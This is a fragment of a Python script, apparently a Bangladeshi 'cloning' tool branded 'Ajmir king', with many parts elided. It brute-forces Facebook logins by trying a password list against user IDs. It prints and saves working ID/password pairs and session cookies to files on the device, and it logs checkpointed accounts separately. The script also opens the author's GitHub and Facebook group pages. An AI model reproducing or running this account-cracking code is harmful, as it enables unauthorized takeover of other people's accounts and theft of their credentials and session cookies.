...
#--------------++ GITHUB        + AJMIR-HOSSAIN-404+--------------------------#
# Ajmir king FUCK DX BRO 
# GITHUB: AJMIR-HOSSAIN-404
import os
...
os.system('xdg-open https://facebook.com/groups/517746880494588/?ref=share')
#-------------color----------------#
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝ 
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;45m      [ TOOLS CREATED BY : Ajmir king ]     \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
def TARA_LOVE():
    clear()
    os.system('xdg-open https://github.com/AJMIR-HOSSAIN-404')
    ...
    if option in ['01','1']:
        BD_CLONING()
    if option in ['02','2']:
    	os.system('xdg-open https://facebook.com/groups/517746880494588/?ref=share');time.sleep(1)
    if option in ['03','3']:
        ...
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[Ajmir king-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;37m [COOKIE-🌸] '+coki)
                    open('/sdcard/Ajmir king-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;35m[Ajmir king-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/Ajmir king-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
...
def approval():
	...
	if key in a:
		...
		os.system('espeak -a 600 " For approved contact admin"')
